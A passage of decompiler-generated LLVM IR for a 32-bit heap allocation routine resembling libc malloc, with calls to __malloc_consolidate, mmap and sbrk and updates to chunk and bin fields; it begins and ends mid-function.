  store i32 %v4_120b4, i32* %r2.global-to-local, align 4
  %v4_120b8 = mul i32 %v1_120a4, 4
  %v5_120b8 = add i32 %v4_120b4, %v4_120b8
  store i32 %v5_120b8, i32* %r3.global-to-local, align 4
  %v1_120bc = add i32 %v5_120b8, 820
  %v2_120bc = inttoptr i32 %v1_120bc to i32*
  %v3_120bc = load i32, i32* %v2_120bc, align 4
  store i32 %v3_120bc, i32* @r4, align 4
  %v2_120c0 = icmp eq i32 %v3_120bc, 0
  br i1 %v2_120c0, label %dec_label_pc_120a4, label %dec_label_pc_120c8

dec_label_pc_120c8:                               ; preds = %dec_label_pc_120b0
  %v4_120c8 = mul i32 %v1_120a4, 256
  %v5_120c8 = add i32 %v4_120b4, %v4_120c8
  store i32 %v5_120c8, i32* %r3.global-to-local, align 4
  %v1_120cc = add i32 %v5_120c8, 44
  store i32 %v1_120cc, i32* %r0.global-to-local, align 4
  %v0_120d0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_120d0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_120e0.preheader

dec_label_pc_120e0.preheader:                     ; preds = %.dec_label_pc_120e0.preheader_crit_edge, %dec_label_pc_120c8
  %v0_120d857 = phi i32 [ %v1_120cc, %dec_label_pc_120c8 ], [ %v0_120d857.pre, %.dec_label_pc_120e0.preheader_crit_edge ]
  %v0_120fc = phi i32 [ %v3_120bc, %dec_label_pc_120c8 ], [ %v1_12094, %.dec_label_pc_120e0.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_120d0, %dec_label_pc_120c8 ], [ %v0_12094, %.dec_label_pc_120e0.preheader_crit_edge ]
  %v2_120e054 = and i32 %ip.promoted, %v0_120fc
  %v4_120e056 = icmp eq i32 %v2_120e054, 0
  br i1 %v4_120e056, label %dec_label_pc_120d8, label %dec_label_pc_120e8

dec_label_pc_120d8:                               ; preds = %dec_label_pc_120e0.preheader, %dec_label_pc_120d8
  %v2_120dc59 = phi i32 [ %v2_120dc, %dec_label_pc_120d8 ], [ %ip.promoted, %dec_label_pc_120e0.preheader ]
  %v0_120d858 = phi i32 [ %v1_120d8, %dec_label_pc_120d8 ], [ %v0_120d857, %dec_label_pc_120e0.preheader ]
  %v1_120d8 = add i32 %v0_120d858, 8
  %v2_120dc = mul i32 %v2_120dc59, 2
  %v2_120e0 = and i32 %v2_120dc, %v0_120fc
  %v4_120e0 = icmp eq i32 %v2_120e0, 0
  br i1 %v4_120e0, label %dec_label_pc_120d8, label %dec_label_pc_120e0.dec_label_pc_120e8_crit_edge

dec_label_pc_120e0.dec_label_pc_120e8_crit_edge:  ; preds = %dec_label_pc_120d8
  store i32 %v1_120d8, i32* %r0.global-to-local, align 4
  store i32 %v2_120dc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_120e8

dec_label_pc_120e8:                               ; preds = %dec_label_pc_120e0.dec_label_pc_120e8_crit_edge, %dec_label_pc_120e0.preheader
  %v0_12108 = phi i32 [ %v2_120dc, %dec_label_pc_120e0.dec_label_pc_120e8_crit_edge ], [ %ip.promoted, %dec_label_pc_120e0.preheader ]
  %v0_1212c = phi i32 [ %v1_120d8, %dec_label_pc_120e0.dec_label_pc_120e8_crit_edge ], [ %v0_120d857, %dec_label_pc_120e0.preheader ]
  %v1_120e8 = add i32 %v0_1212c, 12
  %v2_120e8 = inttoptr i32 %v1_120e8 to i32*
  %v3_120e8 = load i32, i32* %v2_120e8, align 4
  store i32 %v3_120e8, i32* @lr, align 4
  %v9_120ec = icmp eq i32 %v3_120e8, %v0_1212c
  br i1 %v9_120ec, label %dec_label_pc_120f4, label %dec_label_pc_12114

dec_label_pc_120f4:                               ; preds = %dec_label_pc_120e8
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %r0.global-to-local, align 4
  %v1_120f8 = load i32, i32* @r8, align 4
  %v2_120f8 = add i32 %v1_120f8, ptrtoint (i32* @global_var_219f0.357 to i32)
  %v3_120f8 = inttoptr i32 %v2_120f8 to i32*
  %v4_120f8 = load i32, i32* %v3_120f8, align 4
  %v2_120fc = sub i32 -1, %v0_12108
  %v3_120fc = and i32 %v0_120fc, %v2_120fc
  store i32 %v3_120fc, i32* @r4, align 4
  %v1_12100 = load i32, i32* @r5, align 4
  %v4_12100 = mul i32 %v1_12100, 4
  %v5_12100 = add i32 %v4_12100, %v4_120f8
  store i32 %v5_12100, i32* %r3.global-to-local, align 4
  %v1_12104 = add i32 %v0_1212c, 8
  store i32 %v1_12104, i32* %r0.global-to-local, align 4
  %v2_12108 = mul i32 %v0_12108, 2
  store i32 %v2_12108, i32* %ip.global-to-local, align 4
  %v2_1210c = add i32 %v5_12100, 820
  %v3_1210c = inttoptr i32 %v2_1210c to i32*
  store i32 %v3_120fc, i32* %v3_1210c, align 4
  %v0_1208c.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_12094.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1208c

dec_label_pc_12114:                               ; preds = %dec_label_pc_120e8
  %v1_12114 = add i32 %v3_120e8, 4
  %v2_12114 = inttoptr i32 %v1_12114 to i32*
  %v3_12114 = load i32, i32* %v2_12114, align 4
  store i32 %v3_12114, i32* %r3.global-to-local, align 4
  %v1_12118 = and i32 %v3_12114, -4
  store i32 %v1_12118, i32* %r2.global-to-local, align 4
  %v0_1211c = load i32, i32* @sl, align 4
  %v2_1211c = sub i32 %v1_12118, %v0_1211c
  store i32 %v2_1211c, i32* %ip.global-to-local, align 4
  %v1_12120 = add i32 %v3_120e8, 12
  %v2_12120 = inttoptr i32 %v1_12120 to i32*
  %v3_12120 = load i32, i32* %v2_12120, align 4
  store i32 %v3_12120, i32* %r3.global-to-local, align 4
  %tmp212 = icmp ult i32 %v2_1211c, 16
  br i1 %tmp212, label %bb146, label %bb147

bb146:                                            ; preds = %dec_label_pc_12114
  %v6_12128 = add i32 %v1_12118, %v3_120e8
  store i32 %v6_12128, i32* %r2.global-to-local, align 4
  br label %bb147

bb147:                                            ; preds = %dec_label_pc_12114, %bb146
  %v2_1212c = add i32 %v3_12120, 8
  %v3_1212c = inttoptr i32 %v2_1212c to i32*
  store i32 %v0_1212c, i32* %v3_1212c, align 4
  %v0_12130 = load i32, i32* %r3.global-to-local, align 4
  %v1_12130 = load i32, i32* %r0.global-to-local, align 4
  %v2_12130 = add i32 %v1_12130, 12
  %v3_12130 = inttoptr i32 %v2_12130 to i32*
  store i32 %v0_12130, i32* %v3_12130, align 4
  %v4_12134 = load i32, i32* @lr, align 4
  br i1 %tmp212, label %.dec_label_pc_12010_crit_edge, label %dec_label_pc_12140

.dec_label_pc_12010_crit_edge:                    ; preds = %bb147
  %v5_12134 = add i32 %v4_12134, 8
  store i32 %v5_12134, i32* %r4.global-to-local, align 4
  %v4_12138 = load i32, i32* %r2.global-to-local, align 4
  %v5_12138 = add i32 %v4_12138, 4
  %v6_12138 = inttoptr i32 %v5_12138 to i32*
  %v7_12138 = load i32, i32* %v6_12138, align 4
  store i32 %v7_12138, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12010

dec_label_pc_12140:                               ; preds = %bb147
  %v1_12140 = load i32, i32* @sl, align 4
  %v2_12140 = add i32 %v1_12140, %v4_12134
  store i32 %v2_12140, i32* %r1.global-to-local, align 4
  %v1_12148 = load i32, i32* @r6, align 4
  %v2_12148 = add i32 %v1_12148, 8
  %v3_12148 = inttoptr i32 %v2_12148 to i32*
  store i32 %v2_12140, i32* %v3_12148, align 4
  %v0_1214c = load i32, i32* %r1.global-to-local, align 4
  %v1_1214c = load i32, i32* @r6, align 4
  %v2_1214c = add i32 %v1_1214c, 12
  %v3_1214c = inttoptr i32 %v2_1214c to i32*
  store i32 %v0_1214c, i32* %v3_1214c, align 4
  %v0_12150 = load i32, i32* @r6, align 4
  %v1_12150 = load i32, i32* %r1.global-to-local, align 4
  %v2_12150 = add i32 %v1_12150, 8
  %v3_12150 = inttoptr i32 %v2_12150 to i32*
  store i32 %v0_12150, i32* %v3_12150, align 4
  %v0_12154 = load i32, i32* @r6, align 4
  %v1_12154 = load i32, i32* %r1.global-to-local, align 4
  %v2_12154 = add i32 %v1_12154, 12
  %v3_12154 = inttoptr i32 %v2_12154 to i32*
  store i32 %v0_12154, i32* %v3_12154, align 4
  %tmp213 = icmp ult i32 %v1_12140, 256
  br i1 %tmp213, label %bb148, label %.thread124

bb148:                                            ; preds = %dec_label_pc_12140
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %r2.global-to-local, align 4
  %v8_12160 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 64) to i32*), align 4
  store i32 %v8_12160, i32* %r3.global-to-local, align 4
  %v4_12164 = load i32, i32* %r1.global-to-local, align 4
  %v6_12164 = add i32 %v8_12160, 48
  %v7_12164 = inttoptr i32 %v6_12164 to i32*
  store i32 %v4_12164, i32* %v7_12164, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_12140, %bb148
  %v0_12168 = load i32, i32* @sl, align 4
  %v1_12168 = or i32 %v0_12168, 1
  store i32 %v1_12168, i32* %r2.global-to-local, align 4
  %v0_1216c = load i32, i32* %ip.global-to-local, align 4
  %v1_1216c = or i32 %v0_1216c, 1
  store i32 %v1_1216c, i32* %r3.global-to-local, align 4
  %v0_12170 = load i32, i32* @lr, align 4
  %v1_12170 = add i32 %v0_12170, 8
  store i32 %v1_12170, i32* %r4.global-to-local, align 4
  %v2_12174 = add i32 %v0_12170, 4
  %v3_12174 = inttoptr i32 %v2_12174 to i32*
  store i32 %v1_12168, i32* %v3_12174, align 4
  %v0_12178 = load i32, i32* %ip.global-to-local, align 4
  %v1_12178 = load i32, i32* %r1.global-to-local, align 4
  %v3_12178 = add i32 %v1_12178, %v0_12178
  %v4_12178 = inttoptr i32 %v3_12178 to i32*
  store i32 %v0_12178, i32* %v4_12178, align 4
  %v0_1217c = load i32, i32* %r3.global-to-local, align 4
  %v1_1217c = load i32, i32* %r1.global-to-local, align 4
  %v2_1217c = add i32 %v1_1217c, 4
  %v3_1217c = inttoptr i32 %v2_1217c to i32*
  store i32 %v0_1217c, i32* %v3_1217c, align 4
  br label %dec_label_pc_125d8

dec_label_pc_12184.loopexit:                      ; preds = %dec_label_pc_120a4
  br label %dec_label_pc_12184

dec_label_pc_12184:                               ; preds = %dec_label_pc_12184.loopexit, %dec_label_pc_11d98, %dec_label_pc_11da0
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %ip.global-to-local, align 4
  %v4_1218c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 64) to i32*), align 4
  store i32 %v4_1218c, i32* @r0, align 4
  %v1_12190 = add i32 %v4_1218c, 44
  %v2_12190 = inttoptr i32 %v1_12190 to i32*
  %v3_12190 = load i32, i32* %v2_12190, align 4
  store i32 %v3_12190, i32* %ip.global-to-local, align 4
  %v1_12194 = add i32 %v3_12190, 4
  %v2_12194 = inttoptr i32 %v1_12194 to i32*
  %v3_12194 = load i32, i32* %v2_12194, align 4
  %v0_12198 = load i32, i32* @sl, align 4
  %v1_12198 = add i32 %v0_12198, 16
  store i32 %v1_12198, i32* %r1.global-to-local, align 4
  %v1_1219c = and i32 %v3_12194, -4
  store i32 %v1_1219c, i32* %r3.global-to-local, align 4
  %v3_121a0 = icmp ult i32 %v1_1219c, %v1_12198
  br i1 %v3_121a0, label %dec_label_pc_121d0, label %dec_label_pc_121ac

dec_label_pc_121ac:                               ; preds = %dec_label_pc_12184
  %v2_121ac = sub i32 %v1_1219c, %v0_12198
  %v2_121b0 = add i32 %v0_12198, %v3_12190
  store i32 %v2_121b0, i32* %r1.global-to-local, align 4
  %v1_121b4 = or i32 %v2_121ac, 1
  store i32 %v1_121b4, i32* %r3.global-to-local, align 4
  %v1_121b8 = or i32 %v0_12198, 1
  store i32 %v1_121b8, i32* %r2.global-to-local, align 4
  %v1_121bc = add i32 %v3_12190, 8
  store i32 %v1_121bc, i32* %r4.global-to-local, align 4
  store i32 %v1_121b8, i32* %v2_12194, align 4
  %v0_121c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_121c4 = load i32, i32* @r0, align 4
  %v2_121c4 = add i32 %v1_121c4, 44
  %v3_121c4 = inttoptr i32 %v2_121c4 to i32*
  store i32 %v0_121c4, i32* %v3_121c4, align 4
  %v0_121c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_121c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_121c8 = add i32 %v1_121c8, 4
  %v3_121c8 = inttoptr i32 %v2_121c8 to i32*
  store i32 %v0_121c8, i32* %v3_121c8, align 4
  br label %dec_label_pc_125d8

dec_label_pc_121d0:                               ; preds = %dec_label_pc_12184
  %v1_121d0 = inttoptr i32 %v4_1218c to i32*
  %v2_121d0 = load i32, i32* %v1_121d0, align 4
  store i32 %v2_121d0, i32* %r3.global-to-local, align 4
  %v1_121d4 = and i32 %v2_121d0, 2
  store i32 %v1_121d4, i32* %ip.global-to-local, align 4
  %v2_121d4 = icmp eq i32 %v1_121d4, 0
  %v1_121d8 = add i32 %v4_1218c, 860
  %v2_121d8 = inttoptr i32 %v1_121d8 to i32*
  %v3_121d8 = load i32, i32* %v2_121d8, align 4
  store i32 %v3_121d8, i32* %r1.global-to-local, align 4
  br i1 %v2_121d4, label %dec_label_pc_121f0, label %dec_label_pc_121e0

dec_label_pc_121e0:                               ; preds = %dec_label_pc_121d0
  %v0_121e0 = call i32 @__malloc_consolidate()
  %v0_121e4 = load i32, i32* @sl, align 4
  %v1_121e4 = add i32 %v0_121e4, -7
  store i32 %v1_121e4, i32* @r0, align 4
  %v0_121e8 = call i32 @malloc()
  store i32 %v0_121e8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_125d4

dec_label_pc_121f0:                               ; preds = %dec_label_pc_121d0
  %v1_121f0 = add i32 %v4_1218c, 844
  %v2_121f0 = inttoptr i32 %v1_121f0 to i32*
  %v3_121f0 = load i32, i32* %v2_121f0, align 4
  store i32 %v3_121f0, i32* %r3.global-to-local, align 4
  %v3_121f4 = icmp ult i32 %v0_12198, %v3_121f0
  %v1_121f8 = add i32 %v3_121d8, -1
  store i32 %v1_121f8, i32* %sb.global-to-local, align 4
  br i1 %v3_121f4, label %dec_label_pc_122cc, label %dec_label_pc_12200

dec_label_pc_12200:                               ; preds = %dec_label_pc_121f0
  %v1_12200 = add i32 %v4_1218c, 852
  %v2_12200 = inttoptr i32 %v1_12200 to i32*
  %v3_12200 = load i32, i32* %v2_12200, align 4
  store i32 %v3_12200, i32* %r2.global-to-local, align 4
  %v1_12204 = add i32 %v4_1218c, 848
  %v2_12204 = inttoptr i32 %v1_12204 to i32*
  %v3_12204 = load i32, i32* %v2_12204, align 4
  store i32 %v3_12204, i32* %r3.global-to-local, align 4
  %v6_1220c = icmp slt i32 %v3_12204, %v3_12200
  br i1 %v6_1220c, label %dec_label_pc_12210, label %dec_label_pc_122cc

dec_label_pc_12210:                               ; preds = %dec_label_pc_12200
  %v1_12210 = add i32 %v0_12198, 10
  %v2_12214 = add i32 %v1_12210, %v3_121d8
  store i32 %v2_12214, i32* %r3.global-to-local, align 4
  %v2_12218 = sub i32 0, %v3_121d8
  %v3_12218 = and i32 %v2_12214, %v2_12218
  store i32 %v3_12218, i32* @r4, align 4
  %tmp214 = icmp ugt i32 %v3_12218, %v0_12198
  br i1 %tmp214, label %dec_label_pc_12224, label %dec_label_pc_122cc

dec_label_pc_12224:                               ; preds = %dec_label_pc_12210
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_12218, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_1223c = call i32 @mmap(i32 0, i32 %v3_12218, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_1223c, i32* %r0.global-to-local, align 4
  %v7_12240 = icmp eq i32 %v6_1223c, -1
  br i1 %v7_12240, label %dec_label_pc_12224.dec_label_pc_122cc_crit_edge, label %dec_label_pc_12248

dec_label_pc_12224.dec_label_pc_122cc_crit_edge:  ; preds = %dec_label_pc_12224
  %v1_122f0.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_122cc

dec_label_pc_12248:                               ; preds = %dec_label_pc_12224
  %v1_12248 = urem i32 %v6_1223c, 8
  store i32 %v1_12248, i32* %r2.global-to-local, align 4
  %v2_12248 = icmp eq i32 %v1_12248, 0
  br i1 %v2_12248, label %bb149, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_12248
  %v2_1224c = sub nsw i32 8, %v1_12248
  store i32 %v2_1224c, i32* %r3.global-to-local, align 4
  %v2_12250 = load i32, i32* @r4, align 4
  %v3_12250 = sub i32 %v2_12250, %v2_1224c
  %v3_12254 = add i32 %v2_1224c, %v6_1223c
  store i32 %v3_12254, i32* %lr.global-to-local, align 4
  %v2_1225c = or i32 %v3_12250, 2
  store i32 %v2_1225c, i32* %r2.global-to-local, align 4
  %v5_12264 = inttoptr i32 %v3_12254 to i32*
  store i32 %v2_1224c, i32* %v5_12264, align 4
  %v1_12268 = load i32, i32* %r2.global-to-local, align 4
  %v2_12268 = load i32, i32* %lr.global-to-local, align 4
  %v3_12268 = add i32 %v2_12268, 4
  %v4_12268 = inttoptr i32 %v3_12268 to i32*
  store i32 %v1_12268, i32* %v4_12268, align 4
  br label %.thread30

bb149:                                            ; preds = %dec_label_pc_12248
  store i32 %v6_1223c, i32* %lr.global-to-local, align 4
  %v1_1226050 = load i32, i32* @r4, align 4
  %v2_1226051 = or i32 %v1_1226050, 2
  store i32 %v2_1226051, i32* %r3.global-to-local, align 4
  %v3_1226c = inttoptr i32 %v6_1223c to i32*
  store i32 0, i32* %v3_1226c, align 4
  %v1_12270 = load i32, i32* %r3.global-to-local, align 4
  %v2_12270 = load i32, i32* %lr.global-to-local, align 4
  %v3_12270 = add i32 %v2_12270, 4
  %v4_12270 = inttoptr i32 %v3_12270 to i32*
  store i32 %v1_12270, i32* %v4_12270, align 4
  br label %.thread30

.thread30:                                        ; preds = %.thread28, %bb149
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_1227c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 64) to i32*), align 4
  store i32 %v4_1227c, i32* %ip.global-to-local, align 4
  %v1_12280 = add i32 %v4_1227c, 848
  %v2_12280 = inttoptr i32 %v1_12280 to i32*
  %v3_12280 = load i32, i32* %v2_12280, align 4
  store i32 %v3_12280, i32* %r3.global-to-local, align 4
  %v1_12284 = add i32 %v4_1227c, 856
  %v2_12284 = inttoptr i32 %v1_12284 to i32*
  %v3_12284 = load i32, i32* %v2_12284, align 4
  store i32 %v3_12284, i32* %r2.global-to-local, align 4
  %v1_12288 = add i32 %v3_12280, 1
  store i32 %v1_12288, i32* %r3.global-to-local, align 4
  %v7_12290 = icmp sgt i32 %v1_12288, %v3_12284
  br i1 %v7_12290, label %bb150, label %bb151

bb150:                                            ; preds = %.thread30
  store i32 %v1_12288, i32* %v2_12284, align 4
  %v0_12294.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_12294.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb151

bb151:                                            ; preds = %.thread30, %bb150
  %v1_12294 = phi i32 [ %v4_1227c, %.thread30 ], [ %v1_12294.pre, %bb150 ]
  %v0_12294 = phi i32 [ %v1_12288, %.thread30 ], [ %v0_12294.pre, %bb150 ]
  %v2_12294 = add i32 %v1_12294, 848
  %v3_12294 = inttoptr i32 %v2_12294 to i32*
  store i32 %v0_12294, i32* %v3_12294, align 4
  %v0_12298 = load i32, i32* %ip.global-to-local, align 4
  %v1_12298 = add i32 %v0_12298, 868
  %v2_12298 = inttoptr i32 %v1_12298 to i32*
  %v3_12298 = load i32, i32* %v2_12298, align 4
  store i32 %v3_12298, i32* %r3.global-to-local, align 4
  %v1_1229c = add i32 %v0_12298, 880
  %v2_1229c = inttoptr i32 %v1_1229c to i32*
  %v3_1229c = load i32, i32* %v2_1229c, align 4
  store i32 %v3_1229c, i32* %r2.global-to-local, align 4
  %v0_122a0 = load i32, i32* @r4, align 4
  %v2_122a0 = add i32 %v0_122a0, %v3_12298
  store i32 %v2_122a0, i32* %r1.global-to-local, align 4
  %v1_122a4 = add i32 %v0_12298, 872
  %v2_122a4 = inttoptr i32 %v1_122a4 to i32*
  %v3_122a4 = load i32, i32* %v2_122a4, align 4
  store i32 %v3_122a4, i32* %r3.global-to-local, align 4
  %v1_122ac = add i32 %v0_12298, 884
  %v2_122ac = inttoptr i32 %v1_122ac to i32*
  %v3_122ac = load i32, i32* %v2_122ac, align 4
  store i32 %v3_122ac, i32* %r2.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_122a0, %v3_1229c
  br i1 %tmp215, label %bb152, label %bb153

bb152:                                            ; preds = %bb151
  store i32 %v2_122a0, i32* %v2_1229c, align 4
  %v0_122b4.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_122b4.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %bb151, %bb152
  %v1_122b4 = phi i32 [ %v0_12298, %bb151 ], [ %v1_122b4.pre, %bb152 ]
  %v0_122b4 = phi i32 [ %v2_122a0, %bb151 ], [ %v0_122b4.pre, %bb152 ]
  %v2_122b4 = add i32 %v1_122b4, 868
  %v3_122b4 = inttoptr i32 %v2_122b4 to i32*
  store i32 %v0_122b4, i32* %v3_122b4, align 4
  %v0_122b8 = load i32, i32* %r1.global-to-local, align 4
  %v1_122b8 = load i32, i32* %r3.global-to-local, align 4
  %v2_122b8 = add i32 %v1_122b8, %v0_122b8
  store i32 %v2_122b8, i32* %r1.global-to-local, align 4
  %v1_122bc = load i32, i32* %r2.global-to-local, align 4
  %v0_122c0 = load i32, i32* %lr.global-to-local, align 4
  %v1_122c0 = add i32 %v0_122c0, 8
  store i32 %v1_122c0, i32* %r0.global-to-local, align 4
  %tmp216 = icmp ugt i32 %v2_122b8, %v1_122bc
  br i1 %tmp216, label %bb154, label %dec_label_pc_125d4

bb154:                                            ; preds = %bb153
  %v5_122c4 = load i32, i32* %ip.global-to-local, align 4
  %v6_122c4 = add i32 %v5_122c4, 884
  %v7_122c4 = inttoptr i32 %v6_122c4 to i32*
  store i32 %v2_122b8, i32* %v7_122c4, align 4
  br label %dec_label_pc_125d4

dec_label_pc_122cc:                               ; preds = %dec_label_pc_12210, %dec_label_pc_121f0, %dec_label_pc_12224.dec_label_pc_122cc_crit_edge, %dec_label_pc_12200
  %v1_122f0 = phi i32 [ %v1_122f0.pre, %dec_label_pc_12224.dec_label_pc_122cc_crit_edge ], [ %v0_12198, %dec_label_pc_12200 ], [ %v0_12198, %dec_label_pc_121f0 ], [ %v0_12198, %dec_label_pc_12210 ]
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %ip.global-to-local, align 4
  %v4_122d4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 64) to i32*), align 4
  store i32 %v4_122d4, i32* %r3.global-to-local, align 4
  %v1_122d8 = add i32 %v4_122d4, 44
  %v2_122d8 = inttoptr i32 %v1_122d8 to i32*
  %v3_122d8 = load i32, i32* %v2_122d8, align 4
  store i32 %v3_122d8, i32* %r0.global-to-local, align 4
  %v1_122dc = add i32 %v4_122d4, 864
  %v2_122dc = inttoptr i32 %v1_122dc to i32*
  %v3_122dc = load i32, i32* %v2_122dc, align 4
  store i32 %v3_122dc, i32* %r2.global-to-local, align 4
  %v1_122e0 = add i32 %v4_122d4, 840
  %v2_122e0 = inttoptr i32 %v1_122e0 to i32*
  %v3_122e0 = load i32, i32* %v2_122e0, align 4
  store i32 %v3_122e0, i32* %r3.global-to-local, align 4
  %v1_122e4 = add i32 %v3_122d8, 4
  %v2_122e4 = inttoptr i32 %v1_122e4 to i32*
  %v3_122e4 = load i32, i32* %v2_122e4, align 4
  store i32 %v3_122e4, i32* %r1.global-to-local, align 4
  %v1_122ec = urem i32 %v3_122dc, 2
  %v2_122ec = icmp eq i32 %v1_122ec, 0
  %v1_122e8 = add i32 %v1_122f0, 16
  %v2_122f0 = add i32 %v1_122e8, %v3_122e0
  store i32 %v2_122f0, i32* %r3.global-to-local, align 4
  %v1_122f4 = and i32 %v3_122e4, -4
  store i32 %v1_122f4, i32* @r8, align 4
  br i1 %v2_122ec, label %bb156, label %bb155

bb155:                                            ; preds = %dec_label_pc_122cc
  %v3_122f8 = sub i32 %v2_122f0, %v1_122f4
  store i32 %v3_122f8, i32* %r3.global-to-local, align 4
  br label %bb156

bb156:                                            ; preds = %dec_label_pc_122cc, %bb155
  %v0_122fc = phi i32 [ %v2_122f0, %dec_label_pc_122cc ], [ %v3_122f8, %bb155 ]
  %v1_122fc = load i32, i32* %sb.global-to-local, align 4
  %v2_122fc = add i32 %v1_122fc, %v0_122fc
  store i32 %v2_122fc, i32* %r3.global-to-local, align 4
  %v1_12300 = sub i32 -1, %v1_122fc
  store i32 %v1_12300, i32* %fp.global-to-local, align 4
  %v2_12304 = and i32 %v2_122fc, %v1_12300
  store i32 %v2_12304, i32* @r5, align 4
  %tmp157 = icmp slt i32 %v2_12304, 1
  br i1 %tmp157, label %dec_label_pc_12328, label %dec_label_pc_12314

dec_label_pc_12314:                               ; preds = %bb156
  store i32 %v2_12304, i32* %r0.global-to-local, align 4
  %v1_12318 = call i32 @__GI_sbrk(i32 %v2_12304)
  store i32 %v1_12318, i32* %r0.global-to-local, align 4
  %v3_1231c = icmp eq i32 %v1_12318, -1
  store i32 %v1_12318, i32* @r4, align 4
  br i1 %v3_1231c, label %dec_label_pc_12328, label %dec_label_pc_12394

dec_label_pc_12328:                               ; preds = %dec_label_pc_12314, %bb156
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %r1.global-to-local, align 4
  %v4_12330 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 64) to i32*), align 4
  store i32 %v4_12330, i32* %r6.global-to-local, align 4
  %v1_12334 = add i32 %v4_12330, 864
  %v2_12334 = inttoptr i32 %v1_12334 to i32*
  %v3_12334 = load i32, i32* %v2_12334, align 4
  store i32 %v3_12334, i32* %r3.global-to-local, align 4
  %v1_12338 = urem i32 %v3_12334, 2
  %v2_12338 = icmp eq i32 %v1_12338, 0
  br i1 %v2_12338, label %.thread32thread-pre-split, label %bb158

bb158:                                            ; preds = %dec_label_pc_12328
  %v1_1233c = load i32, i32* @r8, align 4
  %v2_1233c = load i32, i32* %sb.global-to-local, align 4
  %v3_1233c = add i32 %v2_1233c, %v1_1233c
  %v2_12340 = load i32, i32* @r5, align 4
  %v3_12340 = add i32 %v3_1233c, %v2_12340
  store i32 %v3_12340, i32* %r3.global-to-local, align 4
  %v2_12344 = load i32, i32* %fp.global-to-local, align 4
  %v3_12344 = and i32 %v2_12344, %v3_12340
  store i32 %v3_12344, i32* @r5, align 4
  br label %.thread32

.thread32thread-pre-split:                        ; preds = %dec_label_pc_12328
  %v0_12348.pr = load i32, i32* @r5, align 4
  br label %.thread32

.thread32:                                        ; preds = %.thread32thread-pre-split, %bb158
  %v0_12348 = phi i32 [ %v0_12348.pr, %.thread32thread-pre-split ], [ %v3_12344, %bb158 ]
  %v2_12348 = icmp ugt i32 %v0_12348, 1048575
  br i1 %v2_12348, label %bb160, label %bb159

bb159:                                            ; preds = %.thread32
  store i32 1048576, i32* @r5, align 4
  br label %bb160

bb160:                                            ; preds = %.thread32, %bb159
  %v0_12360 = phi i32 [ %v0_12348, %.thread32 ], [ 1048576, %bb159 ]
  %v1_12350 = load i32, i32* @sl, align 4
  %tmp217 = icmp ugt i32 %v0_12360, %v1_12350
  br i1 %tmp217, label %dec_label_pc_12358, label %dec_label_pc_125bc

dec_label_pc_12358:                               ; preds = %bb160
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_12360, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_12374 = call i32 @mmap(i32 0, i32 %v0_12360, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_12374, i32* %r0.global-to-local, align 4
  %v3_12378 = icmp eq i32 %v6_12374, -1
  %v8_12378 = icmp eq i32 %v6_12374, -1
  store i32 %v6_12374, i32* @r4, align 4
  br i1 %v8_12378, label %.thread35, label %bb161

bb161:                                            ; preds = %dec_label_pc_12358
  %v1_12380 = load i32, i32* %r6.global-to-local, align 4
  %v2_12380 = add i32 %v1_12380, 864
  %v3_12380 = inttoptr i32 %v2_12380 to i32*
  %v4_12380 = load i32, i32* %v3_12380, align 4
  %v2_12384 = load i32, i32* @r5, align 4
  %v3_12384 = add i32 %v2_12384, %v6_12374
  store i32 %v3_12384, i32* %r0.global-to-local, align 4
  %v2_12388 = and i32 %v4_12380, -2
  store i32 %v2_12388, i32* %r3.global-to-local, align 4
  store i32 %v2_12388, i32* %v3_12380, align 4
  br label %.thread35

.thread35:                                        ; preds = %dec_label_pc_12358, %bb161
  br i1 %v3_12378, label %dec_label_pc_12394, label %dec_label_pc_12398

dec_label_pc_12394:                               ; preds = %.thread35, %dec_label_pc_12314
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12398

dec_label_pc_12398:                               ; preds = %.thread35, %dec_label_pc_12394
